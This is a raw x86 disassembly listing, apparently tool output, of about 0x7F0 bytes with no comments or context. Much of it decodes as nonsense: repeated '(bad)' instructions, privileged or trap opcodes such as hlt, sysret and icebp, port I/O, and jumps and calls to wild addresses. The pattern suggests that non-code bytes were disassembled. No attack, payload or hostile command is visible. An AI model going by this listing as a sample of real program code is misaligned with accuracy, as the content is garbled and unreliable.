  43297f:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  432985:	or     BYTE PTR [ebp+0x7],al
  432988:	mov    eax,ecx
  43298a:	clc    
  43298b:	jb     0x43294e
  43298d:	add    BYTE PTR [ebp+0x55],cl
  432990:	or     DWORD PTR [edi],0xc251d154
  432996:	add    DWORD PTR [ebx+0x32009b],0x8b76453b
  4329a0:	mov    edi,eax
  4329a2:	or     cl,al
  4329a4:	inc    ebp
  4329a5:	dec    ebp
  4329a6:	mov    eax,DWORD PTR [ecx+0x514d540c]
  4329ac:	or     WORD PTR [ecx],0x899b
  4329b1:	xor    cl,BYTE PTR [ebx+0x5476fc3b]
  4329b7:	mov    edx,DWORD PTR [ecx+0x8]
  4329ba:	mov    eax,DWORD PTR [ebp-0x8]
  4329bd:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb265]
  4329c4:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  4329ca:	inc    ebp
  4329cb:	dec    eax
  4329cc:	add    ecx,DWORD PTR [ebx+0x544df0f8]
  4329d2:	add    edx,DWORD PTR [ecx-0x8]
  4329d5:	mov    ecx,DWORD PTR [ecx]
  4329d7:	clc    
  4329d8:	or     BYTE PTR [ebp+eax*2+0x4532409b],al
  4329df:	mov    ecx,ebp
  4329e1:	clc    
  4329e2:	(bad)  
  4329e3:	popf   
  4329e4:	inc    DWORD PTR [eax]
  4329e6:	ret    0x8b
  4329e9:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  4329ef:	mov    edi,esp
  4329f1:	hlt    
  4329f2:	test   ecx,esi
  4329f4:	clc    
  4329f5:	or     BYTE PTR [ebp+0x7],al
  4329f8:	xor    al,cl
  4329fa:	pushf  
  4329fb:	jb     0x432a30
  4329fd:	add    BYTE PTR [eax-0x3f],al
  432a00:	inc    eax
  432a01:	daa    
  432a02:	inc    ebp
  432a03:	inc    ebp
  432a04:	xor    eax,0x7f80803
  432a09:	dec    ebp
  432a0a:	fwait
  432a0b:	add    esi,DWORD PTR [edx]
  432a0d:	clc    
  432a0e:	cmp    DWORD PTR [ecx],ecx
  432a10:	or     al,0x8
  432a12:	add    al,BYTE PTR [ebp+0x2c]
  432a15:	xor    eax,0x7350845
  432a1a:	or     BYTE PTR [ebp+0x7],cl
  432a1d:	lea    ebx,[ebx-0x748dcdff]
  432a23:	add    BYTE PTR [eax*2-0x74b21438],cl
  432a2a:	mov    edx,DWORD PTR [eax]
  432a2c:	cld    
  432a2d:	dec    ebp
  432a2e:	push   esp
  432a2f:	sub    edx,DWORD PTR [ecx-0x75]
  432a32:	add    eax,0xf172fc
  432a37:	or     BYTE PTR [ebp+0x7],cl
  432a3a:	add    eax,ecx
  432a3c:	or     al,0x72
  432a3e:	add    DWORD PTR [eax],eax
  432a40:	mov    ebx,0x29c2c1
  432a45:	inc    ebp
  432a46:	mov    eax,DWORD PTR [ebx]
  432a48:	cmp    eax,0x3004d1c
  432a4e:	xbegin 0x66c8b648
  432a54:	clc    
  432a55:	or     BYTE PTR [ebp+0x45],al
  432a58:	xor    dh,BYTE PTR ds:0x78b089c
  432a5e:	adc    BYTE PTR [ebp+0x45],cl
  432a61:	lea    eax,[ebp+0x33727501]
  432a67:	add    cl,ch
  432a69:	inc    ebp
  432a6a:	add    bl,ch
  432a6c:	add    BYTE PTR [ebx+0x45850845],cl
  432a72:	je     0x4329ff
  432a74:	push   ebx
  432a75:	or     al,0x85
  432a77:	dec    ebp
  432a78:	std    
  432a79:	mov    bh,bh
  432a7b:	mov    BYTE PTR [ebp-0x75],al
  432a7e:	mov    edi,eax
  432a80:	or     al,0x89
  432a82:	inc    ebp
  432a83:	clc    
  432a84:	mov    esp,esp
  432a86:	hlt    
  432a87:	call   DWORD PTR [edi-0x37]
  432a8a:	push   esp
  432a8b:	or     al,0x51
  432a8d:	push   ebp
  432a8e:	xor    ebp,esp
  432a90:	mov    esi,0x457251
  432a95:	xor    esi,eax
  432a97:	pushf  
  432a98:	inc    ebp
  432a99:	(bad)  
  432a9a:	mov    edi,eax
  432a9c:	or     al,0x85
  432a9e:	add    al,bh
  432aa0:	inc    eax
  432aa2:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  432aa6:	or     ah,bh
  432aa8:	inc    eax
  432aa9:	push   esp
  432aaa:	jmp    0x432afd
  432aac:	mov    eax,DWORD PTR ds:0xe8720c
  432ab2:	mov    DWORD PTR [ebp-0x8],eax
  432ab5:	jne    0x432afc
  432ab7:	jmp    0x432a44
  432ab9:	mov    ebp,DWORD PTR [eax]
  432abb:	clc    
  432abc:	retf   0xff54
  432abf:	push   ecx
  432ac0:	mov    DWORD PTR ds:0x757210,eax
  432ac6:	mov    ecx,DWORD PTR [ebp-0x4]
  432ac9:	sub    esp,DWORD PTR [ebx-0x77]
  432acc:	dec    DWORD PTR [eax*4-0x74ca8abb]
  432ad3:	or     ah,bh
  432ad5:	pop    es
  432ad6:	ds fwait
  432ad8:	push   DWORD PTR [edx]
  432ada:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  432ae0:	(bad)  
  432ae1:	mov    bh,bh
  432ae3:	jmp    0x432ad1
  432ae5:	leave  
  432ae6:	jne    0x432af0
  432ae8:	call   0x302442
  432aed:	in     al,dx
  432aee:	dec    ebp
  432aef:	add    dh,BYTE PTR [ebx]
  432af1:	add    BYTE PTR [ebx],al
  432af3:	inc    ebp
  432af4:	cmp    esi,DWORD PTR [ecx]
  432af6:	je     0x432a94
  432af8:	mov    eax,edi
  432afa:	or     al,0xf0
  432afc:	add    BYTE PTR [ebp+0x458bf845],al
  432b02:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  432b08:	adc    al,0x7
  432b0a:	enter  0x9fc0,0xa5
  432b0e:	rol    BYTE PTR [eax],0x5e
  432b11:	mov    ecx,ecx
  432b13:	or     al,0xc
  432b15:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  432b1c:	jmp    0x432b1d
  432b1e:	push   ebp
  432b1f:	mov    esp,ebp
  432b21:	cld    
  432b22:	inc    ebp
  432b23:	inc    ebp
  432b24:	or     DWORD PTR [ecx+0x457dec10],0x0
  432b2b:	push   esi
  432b2c:	push   esi
  432b2d:	mov    edi,0x7af080f
  432b32:	add    bh,al
  432b34:	test   DWORD PTR [ebx+0x3a7320f],ebx
  432b3a:	add    BYTE PTR [ecx+0x4540100f],cl
  432b40:	mov    ebp,eax
  432b42:	mov    ebp,edi
  432b44:	lock call edx
  432b47:	fcom   DWORD PTR [ebp+0x45]
  432b4a:	mov    eax,0x148a8b
  432b4f:	push   ecx
  432b50:	enter  0xc145,0x83
  432b54:	cmp    ecx,DWORD PTR [eax]
  432b56:	add    BYTE PTR [ebp+0x4d],al
  432b59:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  432b5f:	call   0xffa326ce
  432b64:	cmp    eax,DWORD PTR [ebp-0xc]
  432b67:	jmp    DWORD PTR [eax+edx*1-0x4e]
  432b6b:	push   ebp
  432b6c:	(bad)  
  432b6d:	call   0x342971
  432b72:	mov    bh,0xdb
  432b74:	cld    
  432b75:	or     BYTE PTR [ebp+0x45],bl
  432b78:	(bad)  
  432b79:	call   0xff7d2809
  432b7e:	add    al,BYTE PTR [ebp+0x37]
  432b81:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  432b87:	jne    0x432b89
  432b89:	(bad)  
  432b8a:	cmp    edi,esp
  432b8c:	jne    0x432bbf
  432b8e:	mov    edi,edi
  432b90:	or     BYTE PTR [ebx-0x307f0b49],cl
  432b96:	pop    ds
  432b97:	into   
  432b98:	je     0x432b5b
  432b9a:	mov    ebx,DWORD PTR [esi]
  432b9c:	or     BYTE PTR [ebp-0x49],al
  432b9f:	mov    esp,DWORD PTR [esi-0x77]
  432ba2:	mov    esi,0x2451f0c
  432ba7:	mov    eax,DWORD PTR [eax]
  432ba9:	or     al,0x66
  432bab:	sar    bl,0x3b
  432bae:	xor    esi,DWORD PTR [ebp+0x66]
  432bb1:	xor    ecx,edi
  432bb3:	pop    edi
  432bb4:	adc    bl,BYTE PTR [ebx+0x7e]
  432bb7:	ret    0xff
  432bba:	cld    
  432bbb:	inc    ebp
  432bbc:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  432bc2:	cld    
  432bc3:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  432bca:	push   0xffffff83
  432bcc:	pop    edi
  432bcd:	or     BYTE PTR [ebp+0x53],dh
  432bd0:	xorps  xmm1,xmm2
  432bd3:	test   BYTE PTR [eax+eax*1],bh
  432bd6:	add    BYTE PTR [eax],al
  432bd8:	adc    eax,eax
  432bda:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  432be2:	jmp    DWORD PTR [eax]
  432be4:	ror    al,0x5e
  432be7:	inc    ebp
  432be8:	leave  
  432be9:	xor    ecx,DWORD PTR [eax]
  432beb:	and    DWORD PTR [ebx-0x3ec30708],ecx
  432bf1:	add    ah,al
  432bf3:	xor    edi,edi
  432bf5:	xor    DWORD PTR [ebx],0x66003302
  432bfb:	mov    DWORD PTR [ebp-0xc],ecx
  432bfe:	pcmpgtw mm0,mm0
  432c01:	add    dl,ah
  432c03:	leave  
  432c04:	mov    edi,DWORD PTR [ebx+eax*4+0x66]
  432c08:	push   eax
  432c09:	dec    ebp
  432c0a:	mov    esi,DWORD PTR [ebx-0x75]
  432c0d:	lea    ebp,[eax-0x7c00ff02]
  432c13:	xor    eax,DWORD PTR [eax]
  432c15:	sysret 
  432c17:	dec    ebp
  432c18:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  432c1f:	push   WORD PTR [ecx+0x8]
  432c23:	jne    0x432be6
  432c25:	ud0    ecx,DWORD PTR [ecx]
  432c28:	mov    eax,edx
  432c2a:	lods   al,BYTE PTR ds:[esi]
  432c2b:	add    BYTE PTR [eax],al
  432c2d:	data16 (bad) 
  432c2f:	iret   
  432c30:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  432c37:	cli    
  432c38:	inc    ebp
  432c39:	cmp    al,0x8d
  432c3b:	add    BYTE PTR [esi+0x2d],ah
  432c3e:	inc    ebp
  432c3f:	pop    ebp
  432c40:	lea    ecx,[edi]
  432c42:	mov    dl,bh
  432c44:	add    BYTE PTR [edi],cl
  432c46:	mov    DWORD PTR [eax+eax*8],edi
  432c49:	mov    ebx,0x3b87
  432c4e:	add    BYTE PTR [ebx],ch
  432c50:	inc    ebp
  432c51:	data16 (bad) 
  432c53:	clc    
  432c54:	int3   
  432c55:	cmp    eax,DWORD PTR [eax]
  432c57:	je     0x432be2
  432c59:	push   0xffffffc8
  432c5b:	pop    edi
  432c5c:	xchg   DWORD PTR [ebp+0x0],eax
  432c5f:	data16 add BYTE PTR [ebp+0x45],cl
  432c63:	lea    cx,[ebp+0x10]
  432c67:	jb     0x432c69
  432c69:	jmp    0x432bf4
  432c6b:	call   eax
  432c6d:	clc    
  432c6e:	xchg   DWORD PTR [edi+0x1],edi
  432c71:	mov    eax,DWORD PTR [eax]
  432c73:	or     BYTE PTR [ebp-0x49],al
  432c76:	lea    eax,[eax+0x74003154]
  432c7c:	push   edi
  432c7d:	inc    edx
  432c7e:	jge    0x432c7f
  432c80:	mov    DWORD PTR [edi],ecx
  432c82:	fdiv   DWORD PTR [edi-0x6]
  432c85:	inc    DWORD PTR [eax]
  432c87:	xor    edx,DWORD PTR [eax+0x5f]
  432c8a:	xchg   DWORD PTR [ebx+0x1],ebx
  432c8d:	ret    0x0
  432c90:	xor    BYTE PTR [ebp-0x51],cl
  432c93:	cmp    edi,0xf0ff89fe
  432c99:	data16 ror al,0x84
  432c9d:	rol    BYTE PTR [eax],0x3b
  432ca0:	add    al,dh
  432ca2:	dec    eax
  432ca3:	xchg   esp,eax
  432ca4:	push   ebx
  432ca5:	jmp    0x432c32
  432ca7:	push   ebp
  432ca8:	add    esp,ebp
  432caa:	add    ebp,esp
  432cac:	mov    edx,DWORD PTR [edi+0x24]
  432caf:	clc    
  432cb0:	dec    esi
  432cb1:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  432cb7:	cmp    BYTE PTR [ebx],al
  432cb9:	jne    0x432c44
  432cbb:	xor    esp,eax
  432cbd:	jmp    0x462e40
  432cc2:	add    ebp,DWORD PTR [ecx+ecx*4]
  432cc5:	jne    0x432cbb
  432cc7:	call   0xffcd2a21
  432ccc:	clc    
  432ccd:	xchg   edi,eax
  432cce:	sti    
  432ccf:	add    DWORD PTR [ebx],eax
  432cd1:	add    BYTE PTR [ebp+0x47],bl
  432cd4:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  432cda:	pop    ebp
  432cdb:	mov    DWORD PTR [esi-0x48],esi
  432cde:	jmp    0x432d27
  432ce0:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  432ce6:	(bad)  
  432ce8:	cmp    al,0x0
  432cea:	cmp    eax,DWORD PTR [ebp+0x18]
  432ced:	lea    ebx,[ebp-0x56]
  432cf0:	jle    0x432cf2
  432cf2:	jae    0x432c7d
  432cf4:	mov    eax,esp
  432cf6:	call   0xb900:0x8b005587
  432cfd:	inc    ebp
  432cfe:	push   ebp
  432cff:	lea    ecx,[ebp-0x27ff4f12]
  432d05:	mov    eax,edi
  432d07:	int3   
  432d08:	push   ebp
  432d09:	xchg   edi,eax
  432d0b:	add    esp,ebp
  432d0d:	add    BYTE PTR [eax],al
  432d0f:	inc    ebp
  432d10:	add    BYTE PTR [ebp+0x8b3255],cl
  432d16:	cld    
  432d17:	mov    DWORD PTR [edx],edi
  432d19:	aam    0x75
  432d1b:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  432d21:	mov    DWORD PTR [ebx-0x50],edx
  432d24:	test   BYTE PTR [ebp-0x1],0xe8
  432d28:	mov    eax,DWORD PTR [eax]
  432d2a:	hlt    
  432d2b:	add    al,al
  432d2d:	mov    eax,DWORD PTR ds:0x890045a8
  432d33:	dec    DWORD PTR [ebx+0x45fdf0e8]
  432d39:	inc    DWORD PTR [eax*2+0xf75854d]
  432d40:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  432d46:	call   0x72998a87
  432d4b:	je     0x432dab
  432d4d:	js     0x432dae
  432d4f:	lock ret 0x7e
  432d53:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  432d59:	mov    edi,edi
  432d5b:	sbb    al,bl
  432d5d:	clc    
  432d5e:	add    BYTE PTR [ebp-0x73],bh
  432d61:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  432d67:	ror    BYTE PTR [eax],1
  432d69:	dec    ebp
  432d6a:	xchg   ebp,eax
  432d6b:	mov    edi,edi
  432d6d:	in     al,0x8b
  432d6f:	jge    0x432cfa
  432d71:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  432d77:	clc    
  432d78:	pop    esi
  432d79:	fist   DWORD PTR [ebp+0x5d398b5d]
  432d7f:	clc    
  432d80:	add    al,0x6e
  432d82:	mov    eax,DWORD PTR [ebx]
  432d84:	mov    BYTE PTR [ebp+0x0],dl
  432d87:	mov    edx,DWORD PTR [ebx-0x20]
  432d8a:	adc    esi,DWORD PTR [edi+0x5e005f3c]
  432d90:	add    eax,0x3b3b73
  432d95:	adc    al,0x89
  432d97:	pop    eax
  432d98:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  432d9c:	ret    0xf08
  432d9f:	cmp    al,0x2
  432da1:	mov    edx,eax
  432da3:	cld    
  432da4:	add    BYTE PTR [ebp+0x66],dl
  432da7:	add    eax,ebx
  432da9:	add    esp,eax
  432dab:	sub    eax,eax
  432dad:	or     BYTE PTR [ecx-0x77f474bb],cl
  432db3:	add    BYTE PTR [eax],al
  432db5:	mov    DWORD PTR [ebx-0x24],ebx
  432db8:	push   edi
  432db9:	push   ebp
  432dba:	clc    
  432dbb:	add    DWORD PTR [esi+0x1b0100],0x45
  432dc2:	out    0xff,eax
  432dc4:	add    edx,DWORD PTR [eax]
  432dc6:	jmp    0x432db0
  432dc8:	cmp    ch,0x46
  432dcb:	(bad)  
  432dcc:	jmp    0x40c8b61e
  432dd1:	je     0x432d5d
  432dd3:	mov    eax,DWORD PTR [eax-0x10c78104]
  432dd9:	inc    ebp
  432dda:	add    BYTE PTR [ebx-0x770375],al
  432de0:	add    ah,ch
  432de2:	add    edx,esp
  432de4:	pop    edi
  432de5:	pop    ebp
  432de6:	push   ebp
  432de7:	inc    ebx
  432de8:	in     al,dx
  432de9:	pop    ebp
  432dea:	in     al,dx
  432deb:	cmp    edx,DWORD PTR [edi-0x8]
  432dee:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  432df5:	add    al,0x47
  432df7:	push   ebp
  432df8:	mov    esp,ebp
  432dfa:	in     al,0x45
  432dfc:	dec    ebp
  432dfd:	push   esi
  432dfe:	test   DWORD PTR [eax+0xfb010f],esi
  432e04:	add    BYTE PTR [eax+0xc018b],dh
  432e0a:	leave  
  432e0b:	inc    ebp
  432e0c:	test   al,ch
  432e0e:	add    dh,bh
  432e10:	add    bh,bh
  432e12:	dec    ebp
  432e13:	push   cs
  432e14:	mov    DWORD PTR [ecx],eax
  432e16:	hlt    
  432e17:	push   es
  432e18:	dec    ebp
  432e19:	leave  
  432e1a:	mov    DWORD PTR [eax],ecx
  432e1c:	clc    
  432e1d:	cmovge eax,ecx
  432e20:	mov    ecx,0x85c2f0
  432e26:	clc    
  432e27:	pop    DWORD PTR [ebp+0x1]
  432e2a:	push   ebx
  432e2b:	add    BYTE PTR [ebp-0x15],bh
  432e2e:	push   esi
  432e2f:	xor    eax,0x898a45
  432e34:	cld    
  432e35:	add    al,BYTE PTR [ebp+0x0]
  432e38:	xor    esp,DWORD PTR [esi-0x64]
  432e3b:	add    DWORD PTR [esi+0x78308c1],edi
  432e41:	add    ah,BYTE PTR [ebp-0x49]
  432e44:	int    0xbb
  432e46:	mov    ecx,DWORD PTR [esi+0xc]
  432e49:	add    dh,al
  432e4b:	cmp    ecx,ebx
  432e4d:	jne    0x432e17
  432e4f:	xor    ecx,DWORD PTR [ebp+0x66]
  432e52:	jmp    0xca2e58
  432e57:	add    DWORD PTR [ebp+0x0],eax
  432e5a:	mov    eax,ebx
  432e5c:	or     al,0x8b
  432e5e:	(bad)  
  432e5f:	mov    ecx,esi
  432e61:	mov    BYTE PTR [eax+eax*1+0x664c136],cl
  432e68:	mov    eax,edi
  432e6a:	or     BYTE PTR [edx],cl
  432e6c:	shl    cl,cl
  432e6e:	icebp  
  432e6f:	add    BYTE PTR [ebp+0x38],0x8b
  432e73:	or     BYTE PTR [edx+eax*2],cl
  432e76:	(bad)  
  432e77:	or     cl,dh
  432e79:	stc    
  432e7a:	shl    DWORD PTR [ebp-0x30],0xc6
  432e7e:	xor    al,0x0
  432e80:	inc    ebp
  432e81:	xchg   BYTE PTR [ebx],al
  432e83:	add    esp,edi
  432e85:	add    BYTE PTR [ebp-0x39],cl
  432e88:	mov    al,bl
  432e8a:	test   DWORD PTR [ebx+0x1c348375],ecx
  432e90:	sub    al,0xbf
  432e92:	jmp    0x432e19
  432e94:	mov    edi,eax
  432e96:	lock jge 0x432e8a
  432e99:	lea    esi,[edx-0x74bad5ff]
  432e9f:	mov    ebp,esp
  432ea1:	or     cl,dh
  432ea3:	leave  
  432ea4:	add    al,BYTE PTR [eax+eax*4-0x37ff9b00]
  432eab:	dec    ebp
  432eac:	dec    ebp
  432ead:	test   DWORD PTR [ebx],eax
  432eaf:	paddb  mm6,mm0
  432eb2:	add    DWORD PTR [eax],eax
  432eb4:	dec    ebp
  432eb5:	mov    ecx,DWORD PTR [ebx-0x64b217f0]
  432ebb:	mov    esi,DWORD PTR [edx]
  432ebd:	or     al,0x2b
  432ebf:	dec    ebp
  432ec0:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  432ec6:	mov    esp,edi
  432ec8:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  432ecf:	mov    DWORD PTR [ebx],ebp
  432ed1:	call   0xc76b801
  432ed6:	mov    DWORD PTR [ebp+0x10],ecx
  432ed9:	(bad)  
  432eda:	push   0x8b85ff10
  432edf:	clc    
  432ee0:	or     al,0x54
  432ee2:	(bad)  
  432ee3:	push   ecx
  432ee4:	retf   
  432ee5:	mov    ebx,0xff4d8dc8
  432eea:	mov    DWORD PTR [ebp+0x8],eax
  432eed:	xor    eax,DWORD PTR [ebp-0x75]
  432ef0:	cmp    ebp,DWORD PTR [ebx]
  432ef2:	lsl    ebx,WORD PTR [edi-0x8]
  432ef6:	call   DWORD PTR [ebx-0x741bff75]
  432efc:	(bad)  
  432efd:	or     al,0x5b
  432eff:	dec    ebp
  432f00:	or     BYTE PTR [ebx],dh
  432f02:	inc    ebp
  432f03:	xor    esi,DWORD PTR ds:0x708088d
  432f09:	in     eax,0x9b
  432f0b:	add    BYTE PTR [edx],dh
  432f0d:	inc    ebp
  432f0e:	pop    edi
  432f0f:	xor    eax,edx
  432f11:	test   DWORD PTR [eax],0x81108b8b
  432f17:	dec    ebp
  432f18:	sub    al,0x33
  432f1a:	add    BYTE PTR [ebx],dh
  432f1c:	push   esi
  432f1d:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  432f23:	mov    edi,eax
  432f25:	or     BYTE PTR [ebp+0x45],al
  432f28:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  432f2e:	xor    ecx,ecx
  432f30:	pushf  
  432f31:	push   es
  432f32:	mov    DWORD PTR [esi-0x4],0xf8178538
  432f39:	dec    ebp
  432f3a:	inc    ebp
  432f3b:	cmp    BYTE PTR [ecx],0x54
  432f3e:	pushf  
  432f3f:	gs (bad) 
  432f41:	shl    esp,1
  432f43:	dec    ebp
  432f44:	xchg   BYTE PTR [eax-0x3dbaab08],al
  432f4a:	shr    ecx,1
  432f4c:	xlat   BYTE PTR ds:[ebx]
  432f4d:	rol    bh,cl
  432f4f:	mov    edx,esp
  432f51:	or     BYTE PTR [ebp+0x4588f84d],al
  432f57:	mov    ecx,DWORD PTR [eax]
  432f59:	or     BYTE PTR [eax],al
  432f5b:	push   ebp
  432f5c:	mov    edi,DWORD PTR [eax+0xfc728b]
  432f62:	dec    ebp
  432f63:	enter  0xceba,0x8
  432f67:	retf   0x1807
  432f6a:	ret    0x9b4d
  432f6d:	mov    esi,DWORD PTR [edx]
  432f6f:	or     al,0x33
  432f71:	into   
  432f72:	add    edx,esi
  432f74:	add    ecx,edx
  432f76:	bswap  eax
  432f78:	ror    esi,0x98
  432f7b:	dec    ebp
  432f7c:	add    cl,ch
  432f7e:	mov    edi,edi
  432f80:	hlt    
  432f81:	inc    esi
  432f83:	inc    ebp
  432f84:	ret    0x4533
  432f87:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  432f8d:	or     BYTE PTR [ebx],dh
  432f8f:	dec    ebp
  432f90:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  432f96:	jne    0xff8d2f5d
  432f9c:	inc    ebp
  432f9d:	inc    ebp
  432f9e:	mov    esi,DWORD PTR [ebx]
  432fa0:	clc    
  432fa1:	pop    esi
  432fa2:	ret    0xcaeb
  432fa5:	mov    eax,esi
  432fa7:	call   0x5204847a
  432fac:	dec    ebp
  432fad:	add    eax,0xf8728b
  432fb2:	adc    eax,0xce0ccac9
  432fb7:	push   ebp
  432fb8:	ret    0xc6ec
  432fbb:	in     al,dx
  432fbc:	call   0x33437cc5
  432fc1:	push   edi
  432fc2:	add    edi,eax
  432fc4:	xor    eax,eax
  432fc6:	jmp    0x43300d
  432fc8:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  432fce:	add    eax,edi
  432fd0:	shr    eax,cl
  432fd2:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  432fd8:	mov    esi,DWORD PTR [edx]
  432fda:	in     al,dx
  432fdb:	pushf  
  432fdc:	ret    0x84c7
  432fdf:	fcomp  DWORD PTR [ebx-0x7607cd7b]
  432fe5:	inc    ebp
  432fe6:	in     al,dx
  432fe7:	xor    DWORD PTR [ebp-0x64],eax
  432fea:	mov    eax,edi
  432fec:	cld    
  432fed:	fmul   st(2),st
  432fef:	sbb    dl,al
  432ff1:	jmp    0x9c3b:0x304d45c1
  432ff8:	jbe    0x432fc1
  432ffa:	mov    esp,eax
  432ffc:	clc    
  432ffd:	add    BYTE PTR [ebp+0x0],cl
  433000:	mov    ecx,ecx
  433002:	lea    eax,[ebp-0x5]
  433005:	mov    edi,edi
  433007:	call   0x51ce8451
  43300c:	hlt    
  43300d:	xor    eax,edx
  43300f:	mov    esi,0x9b7284
  433014:	xor    cl,dl
  433016:	mov    esi,eax
  433018:	hlt    
  433019:	into   
  43301a:	inc    ebp
  43301b:	scas   eax,DWORD PTR es:[edi]
  43301c:	mov    ebp,ecx
  43301e:	cld    
  43301f:	add    dl,cl
  433021:	add    dl,al
  433023:	inc    ebp
  433024:	shr    DWORD PTR [ebx],0x4d
  433027:	xor    edi,DWORD PTR [ebx]
  433029:	mov    DWORD PTR [edi],ecx
  43302b:	clc    
  43302c:	dec    esi
  43302d:	inc    ebp
  43302e:	dec    DWORD PTR [ebx-0x3d2b1775]
  433034:	ret    0xc6ca
  433037:	mov    BYTE PTR [ebp-0x32],0x53
  43303b:	scas   eax,DWORD PTR es:[edi]
  43303c:	inc    ebp
  43303d:	jmp    0x43306f
  43303f:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  433046:	pop    ebx
  433047:	xor    ecx,DWORD PTR [ebp+0x3]
  43304a:	mov    eax,DWORD PTR [ebx]
  43304c:	clc    
  43304d:	test   edx,ecx
  43304f:	mov    ecx,esi
  433051:	cld    
  433052:	call   0x8ab7759c
  433057:	xor    ecx,DWORD PTR [eax+0x4533f303]
  43305d:	add    ecx,DWORD PTR [ebx-0x4974072d]
  433063:	fdiv   QWORD PTR [ebx]
  433065:	retf   0xce89
  433068:	in     al,0xc1
  43306a:	inc    ebp
  43306b:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  433071:	into   
  433072:	mov    dh,0xc1
  433075:	call   0x8c1775fe
  43307a:	(bad)  
  43307b:	cld    
  43307c:	mov    ecx,DWORD PTR [ebp-0x14]
  43307f:	xor    eax,ecx
  433081:	lea    eax,[ebp+0x8]
  433084:	mov    esi,DWORD PTR [edx-0x4]
  433087:	add    dl,al
  433089:	inc    ebp
  43308a:	mov    esp,0x32d89b8b
  43308f:	dec    ebp
  433090:	mov    esi,DWORD PTR [ebx]
  433092:	cld    
  433093:	xor    eax,edx
  433095:	sub    esp,DWORD PTR [ebp-0x75]
  433098:	int    0xec
  43309a:	sub    ecx,eax
  43309c:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  4330a2:	mov    esi,esp
  4330a4:	call   0x34177e2d
  4330a9:	inc    DWORD PTR [ebx]
  4330ab:	mov    edi,DWORD PTR [ebx]
  4330ad:	cld    
  4330ae:	jne    0x4330fd
  4330b0:	mov    esi,DWORD PTR [ebx]
  4330b2:	aam    0x8d
  4330b4:	dec    ebp
  4330b5:	or     BYTE PTR [ebx],dh
  4330b7:	jb     0x4330bc
  4330b9:	add    BYTE PTR [edi+0x45],bl
  4330bc:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  4330c3:	xor    ebp,esp
  4330c5:	xor    eax,edi
  4330c7:	sub    edi,esp
  4330c9:	mov    eax,DWORD PTR [ebp+0x32c8f8f4]
  4330cf:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  4330d6:	inc    ebp
  4330d7:	xor    ecx,DWORD PTR [ecx+0x45891403]
  4330dd:	clc    
  4330de:	mov    eax,edi
  4330e0:	nop
  4330e1:	fadd   QWORD PTR [eax]
  4330e3:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  4330e9:	jmp    0x433074
  4330eb:	mov    eax,DWORD PTR [ecx]
  4330ed:	fadd   DWORD PTR [eax]
  4330ef:	inc    ebp
  4330f0:	or     DWORD PTR [ebx],esi
  4330f2:	dec    eax
  4330f3:	add    edx,DWORD PTR [ebx-0x2d]
  4330f6:	dec    ebp
  4330f7:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  4330fd:	inc    ebp
  4330fe:	push   esp
  4330ff:	mov    dl,BYTE PTR [ecx-0xd]
  433102:	xor    ecx,DWORD PTR [ebp-0x45]
  433105:	(bad)  
  433107:	rol    BYTE PTR [eax],0xc1
  43310a:	ret    
  43310b:	inc    ebp
  43310c:	inc    ebp
  43310d:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  433113:	xor    eax,ebx
  433115:	add    eax,DWORD PTR [ebp+0x23]
  433118:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  43311e:	cmp    edi,0xc
  433121:	dec    ebp
  433122:	inc    ebp
  433123:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  433129:	inc    ebp
  43312a:	mov    esi,DWORD PTR [ebx]
  43312c:	clc    
  43312d:	lea    eax,[ebp+0x45725407]
  433133:	add    BYTE PTR [ebp+eax*2-0x75],dh
  433137:	xor    edi,DWORD PTR [eax]
  433139:	mov    ecx,0xff8b8d4d
  43313e:	push   esp
  43313f:	enter  0x4df7,0x23
  433143:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  433149:	mov    eax,DWORD PTR [ebx]
  43314b:	loopne 0x433138
  43314d:	ret    0xc68b
  433150:	push   esp
  433151:	enter  0x9745,0x8b
  433155:	inc    ebp
  433156:	cld    
  433157:	mov    eax,edi
  433159:	clc    
  43315a:	ret    
  43315b:	ret    0xc645
  43315e:	mov    esi,DWORD PTR [ebx]
  433160:	cld    
  433161:	pop    esi
  433162:	mov    ebx,0x83458bc3
  433168:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  43316c:	dec    ebp
  43316d:	xor    DWORD PTR [ebx],esi
  43316f:	pushf  
